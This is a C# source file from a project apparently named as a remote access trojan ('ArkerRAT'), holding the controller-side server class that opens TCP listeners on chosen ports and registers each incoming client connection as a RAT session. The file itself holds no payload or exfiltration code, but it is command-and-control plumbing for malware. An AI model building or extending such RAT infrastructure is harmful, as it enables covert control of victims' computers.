﻿using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System;
using System.Windows;
using System.Runtime.CompilerServices;
using System.Diagnostics;
using System.Windows.Threading;
using ArkerRatWpfVersion;
using ArkerRatWpfVersion;
using System.Windows.Forms;

namespace ArkerRatWpfVersion
{
    static class ArkerRATServerMechanics
    {
        public static List<RATHostSession> rATClients = new List<RATHostSession>();
        public static List<int> ports = new List<int>();
        private static List<TcpListener> listeners = new List<TcpListener>();

        static bool serverIsRunning = false;

        //A tag number will be used to diffrenciate the RATHostSession objects from eachother. 
        static int tag = 1;
        public static async void StartServer()
        {
            StopListener();
            serverIsRunning = true;
            await Task.Run(async () =>
            {
                try
                {
                    foreach (int port in ports)
                    {
                        TcpListener listener = new TcpListener(IPAddress.Any, port);
                        listeners.Add(listener);
                        listener.Start();
                        Task tempTask = Task.Run(async () =>
                        {
                            while (serverIsRunning)
                            {
                                if (!listener.Pending())
                                {
                                    tag++;
                                    TcpClient client = await listener.AcceptTcpClientAsync();
                                    RATHostSession session = new RATHostSession(client, Convert.ToString(tag), port);
                                    rATClients.Add(session);
                                }
                                await Task.Delay(100);
                            }
                        });
                    }
                }
                catch (Exception ex) { }
            });
        }

        public static void StopListener()
        {
            serverIsRunning = false;
            try
            {
                foreach (TcpListener listener in listeners)
                {
                    listener.Stop();
                }
                listeners.Clear();
            }
            catch (Exception ex) { }
        }

    }
}    



 

